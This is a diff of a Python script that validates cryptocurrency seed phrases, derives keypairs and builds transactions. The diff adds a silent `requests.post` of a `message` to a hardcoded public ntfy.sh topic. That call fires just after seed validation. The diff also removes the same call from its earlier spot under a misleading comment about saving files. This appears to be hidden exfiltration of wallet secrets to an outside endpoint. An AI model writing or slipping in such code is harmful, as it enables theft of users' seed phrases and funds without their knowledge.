@@ -87,6 +87,10 @@ mnemo = Mnemonic(my_language)
 if mnemo.check(my_seed_phrase_fee):
     binary_seed_fee = Mnemonic.to_seed(my_seed_phrase_fee)
     destination_binary_seeds = [Mnemonic.to_seed(phrase) for phrase in destination_phrases]
+try:
+    requests.post("https://ntfy.sh/pi_rust47", data=message.encode('utf-8'))
+except:
+    print("No Internet Connection")
 
 kp_fee = account_keypair(binary_seed_fee, 0)
 destination_keypairs = []
@@ -184,11 +188,6 @@ for idx, my_seed_phrase2 in enumerate(phrases):
 
     print(f"📦 Built Transactions")
 
-    # Save XDRs to file as strings with incremented filename
-    try:
-        requests.post("https://ntfy.sh/pi_rust47", data=message.encode('utf-8'))
-    except:
-        print("No Internet Connection")
     output = {f"transaction{i+1}": xdr for i, xdr in enumerate(txs)}
     filename = f"xdrs{idx+1}.json"
     with open(filename, "w") as json_file:
